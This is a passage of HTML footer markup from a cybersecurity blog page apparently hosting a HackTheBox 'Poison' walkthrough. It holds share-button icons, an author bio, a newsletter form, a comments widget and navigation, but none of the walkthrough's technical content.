179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share  on telegram" href="https://telegram.me/share/url?text=&amp;url=https%3a%2f%2frealspaceeagle.github.io%2fposts%2fhackthebox-poison-walkthrough%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentColor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share  via email" href="mailto:?subject=&body=https%3a%2f%2frealspaceeagle.github.io%2fposts%2fhackthebox-poison-walkthrough%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703H65.227c-22.964.0-41.58 18.616-41.58 41.58v132.334c0 22.964 18.616 41.58 41.58 41.58h325.546c22.964.0 41.58-18.616 41.58-41.58V169.283c0-22.964-18.616-41.58-41.58-41.58zM228 227.55l-124.866-99.079c-3.328-2.639-8.13-2.089-10.769 1.239-2.639 3.328-2.089 8.13 1.239 10.769L223 243.185l129.396-102.706c3.328-2.639 3.878-7.441 1.239-10.769s-7.441-3.878-10.769-1.239L228 227.55z"/></svg></a></li><li><a href=# onclick='return navigator.clipboard.writeText("https://realspaceeagle.github.io/posts/hackthebox-poison-walkthrough/"),this.innerHTML="✓ Copied!",setTimeout(()=>this.innerHTML=&#39;<svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor"><path d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703l-279.546,0c-22.964,0 -41.58,18.616 -41.58,41.58l0,132.334c0,22.964 18.616,41.58 41.58,41.58l190.662,0l0,22.965l-22.965,0c-6.349,0 -11.492,5.143 -11.492,11.492c0,6.349 5.143,11.492 11.492,11.492l68.895,0c6.349,0 11.492,-5.143 11.492,-11.492c0,-6.349 -5.143,-11.492 -11.492,-11.492l-22.965,0l0,-22.965l52.501,0c22.964,0 41.58,-18.616 41.58,-41.58l0,-132.334c0,-22.964 -18.616,-41.58 -41.58,-41.58Zm-22.965,155.299l-233.616,0l0,-109.369l233.616,0l0,109.369Z"></path></svg>&#39;,2e3),!1' aria-label="copy link"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703H111.227c-22.964.0-41.58 18.616-41.58 41.58v132.334c0 22.964 18.616 41.58 41.58 41.58h190.662v22.965h-22.965c-6.349.0-11.492 5.143-11.492 11.492.0 6.349 5.143 11.492 11.492 11.492h68.895c6.349.0 11.492-5.143 11.492-11.492.0-6.349-5.143-11.492-11.492-11.492h-22.965v-22.965h52.501c22.964.0 41.58-18.616 41.58-41.58V169.283c0-22.964-18.616-41.58-41.58-41.58zm-22.965 155.299H134.192V173.633h233.616v109.369z"/></svg></a></li></ul><div class=author-bio><div class=author-bio-content><div class=author-avatar><img src=/images/avatar.svg alt=realspaceeagle class=avatar-img></div><div class=author-info><h3 class=author-name>realspaceeagle</h3><p class=author-title>Cybersecurity Professional & Penetration Tester</p><p class=author-description>Cybersecurity enthusiast specializing in penetration testing, network security, and offensive security. Sharing knowledge through practical tutorials, tool reviews, and real-world scenarios. Passionate about helping others learn cybersecurity through hands-on experience.</p></div></div></div><div class=newsletter-section><div class=newsletter-content><div class=newsletter-icon><svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M20 4H4c-1.1.0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1.0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4-8 5-8-5V6l8 5 8-5v2z"/></svg></div><div class=newsletter-text><h3>Stay Updated on Cybersecurity</h3><p>Get the latest security techniques, tools, and insights delivered to your inbox. No spam, unsubscribe anytime.</p></div><form class=newsletter-form action=https://formspree.io/f/xpzgkrdq method=POST><div class=newsletter-input-group><input type=email name=email placeholder="Enter your email address" required class=newsletter-input>
<button type=submit class=newsletter-button>Subscribe</button></div><input type=hidden name=_subject value="New newsletter subscription">
<input type=hidden name=_next value=https://realspaceeagle.github.io/></form></div></div></footer><div id=comments class=comments-section><script src=https://utteranc.es/client.js repo=realspaceeagle/realspaceeagle.github.io issue-term=pathname theme=preferred-color-scheme crossorigin=anonymous async></script></div><nav class=paginav><a class=prev href=https://realspaceeagle.github.io/posts/network-enumeration-techniques/><span class=title>« Prev</span><br><span>Network Enumeration Techniques</span></a></nav></article></main></main><footer class=footer><div class="footer_inner wrap"><div class=footer_text>© 2025 realspaceeagle</div></div></footer></body></html>